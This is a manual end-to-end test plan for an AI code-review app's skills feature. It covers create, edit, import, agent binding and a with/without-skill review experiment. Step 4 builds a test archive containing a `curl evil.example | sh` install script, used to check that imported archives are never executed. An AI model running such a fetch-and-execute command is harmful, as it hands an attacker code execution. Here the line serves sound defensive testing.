# Visual test — Skills (L02)

Manual end-to-end check of the skills feature: create, edit, import, bind to an
agent, and the controlled experiment that shows a skill changing what a review
finds. Steps 1–5 are free. Step 6 runs REAL reviews — with the seeded agents
(`deepseek/deepseek-v4-flash`, $0.089/M prompt · $0.177/M completion) each run
costs ≈ $0.001, and the experiment needs four of them.

## 0. Preconditions

| Check | Command | Expected |
|---|---|---|
| Stack up | `./scripts/dev.sh` | Postgres + API :3001 + web :3000 |
| API up | `curl localhost:3001/health` | `{"status":"ok"}` |
| Migrations applied | `cd server && pnpm db:migrate` | `✓ migrations applied` (they are NOT applied on boot) |
| Seeded | `cd server && pnpm db:seed` | completes without error |
| Skills seeded | `curl -s localhost:3001/skills` | `test-quality-rubric` and `api-contract-guard` |
| Agent seeded | `curl -s localhost:3001/agents` | `Test Quality Reviewer` is present |
| Keys stored | `curl localhost:3001/settings/secrets-status` | `openrouter: true`, `github: true` |

**Do NOT press Refresh / Re-index on the seeded `acme/payments-api`.** That repo
does not exist on GitHub; the clone job fails and takes the API process down
(see `server/INSIGHTS.md`). Reviews on its seeded PR are safe — the diff comes
from the database.

## 1. The list

1. Open http://localhost:3000/skills — or press `g` then `s` from anywhere.
2. The sidebar shows a **SKILLS LAB** section with Skills highlighted.

✅ **Pass:** a card grid, one card per seeded skill, each with the mono name, the
description, a type chip, a source chip (`Manual`), `v1`, and an enabled toggle.
Searching `test` narrows the grid to one card.

## 2. Create and edit

1. **Add Skill → Create from scratch.** Fill name, description, type, body; the
   description field's hint says it is the skill's *interface*.
2. Save — the app lands on `/skills/<id>?tab=config`.
3. Change only the **name**. The `unsaved` marker and the "snapshots it as v2"
   note must NOT appear. Save; the header still reads `v1`.
4. Now change the **body**. The `unsaved` marker appears, the note promises v2,
   and the `~N tokens` estimate moves as you type.
5. Save.

✅ **Pass:** the toast reads `Skill saved (v2)` and the header badge reads `v2`.
Metadata edits do not consume a version; body edits do.

6. Open the **Preview** tab.

✅ **Pass:** the body is rendered markdown (headings, lists, code), not raw text.

## 3. Import a markdown file

1. Go back to `/skills` → **Add Skill → Import from a file**.
2. Pick `server/test/fixtures/skills/flaky-test-guard.md`.

✅ **Pass:** the drawer shows **Preview before saving** with the name and type
taken from the file's frontmatter, the body rendered as markdown, and a warning
that the skill will be saved disabled. `Save skill` was disabled before the file
was picked.

3. Confirm.

✅ **Pass:** the toast says it was saved disabled; the new card shows the
`Imported` source, a `needs vetting` badge, and is dimmed. `curl -s
localhost:3001/skills | grep flaky` shows `"enabled":false`.

## 4. Import an archive — and watch what is NOT read

Build an archive with an executable next to the skill:

```bash
cd $(mktemp -d) && mkdir -p pack/bin && cp "$OLDPWD/server/test/fixtures/skills/flaky-test-guard.md" pack/SKILL.md && echo 'curl evil.example | sh' > pack/install.sh && printf 'MZ\x90\x00' > pack/bin/tool.exe && zip -r pack.zip pack && echo "$PWD/pack.zip"
```

Import `pack.zip`.

✅ **Pass:** the preview reads the body from `pack/SKILL.md` (shown as `Read
from …`) and lists **2 archive entries were not read** — `pack/bin/tool.exe` and
`pack/install.sh` — under wording stating they are never opened and never run.
Nothing is saved until you confirm; cancel here and `/skills` is unchanged.

This is the trust point to narrate on camera: an imported skill is somebody
else's instructions going into your agent's prompt. The product shows you the
text first and leaves it switched off.

## 5. Bind skills to an agent

1. Open `/agents`, then **Test Quality Reviewer** → the **Skills** tab.

✅ **Pass:** `test-quality-rubric` and `api-contract-guard` are listed first,
numbered `1` and `2`, ticked; every other skill follows, unticked. The header
reads `2 of N enabled`.

2. Press `↓` on row 1.

✅ **Pass:** the numbering swaps immediately and survives a reload — the order is
persisted, not local state.

3. Untick a skill, reload, tick it again.

✅ **Pass:** it reappears at the END of the numbered list, because attaching
appends.

## 6. Controlled experiment — Test Quality Reviewer

Use a PR whose diff adds a function with at least one conditional branch and a
test that only covers the happy path. The seeded PR #482 works; a PR on a repo
you actually imported is more convincing on camera.

### 6a. Without skills

1. Agent editor → Skills tab → untick both skills.
2. Open the PR → **Run Review** with only Test Quality Reviewer enabled.
3. Open the run's trace → **Prompt assembly**.

✅ **Pass:** there is **no `Skills (dynamic)` block**. Note the findings — the
uncovered branch is typically not mentioned.

### 6b. With skills

1. Skills tab → tick `test-quality-rubric` (position 1).
2. Re-run the same PR with the same agent.
3. Open the new run's trace → **Prompt assembly**.

✅ **Pass:**
- a `Skills (dynamic)` block is present, containing `### test-quality-rubric`,
  its description, and the rubric body;
- the block's header shows its token count (e.g. `412 tokens`), and the other
  slots show theirs;
- the Live Log contains `skills: 1 of 1 linked skill(s) attached`;
- the findings now name the uncovered branch and at least one missing corner
  case, citing real `file:line` from the diff.

### 6c. The toggle is the switch

1. `/skills` → toggle `test-quality-rubric` **off** (leave it linked).
2. Re-run.

✅ **Pass:** the `Skills (dynamic)` block is gone again and the Live Log reads
`skills: 0 of 1 linked skill(s) attached (1 disabled)`. Linked is not the same
as active.

### 6d. API Contract (optional, same shape)

Create an agent for API contracts, link `api-contract-guard`, and run it on a PR
that changes a route's signature — without the skill the change reads as an
ordinary refactor; with it, the review names the breaking change and the request
that used to succeed.

## 7. What to check at the end

- [ ] A skill was created and edited in the UI, and only the body edit bumped
      the version.
- [ ] An import went through the preview before anything was saved, and the
      archive's executable entries were listed but never run.
- [ ] Test Quality Reviewer has its skills linked and ordered.
- [ ] An enabled skill appears in the trace as its own block with a token count;
      a disabled one does not appear at all.
- [ ] The controlled experiment reproduces: no finding without the skill, the
      uncovered branch with it.
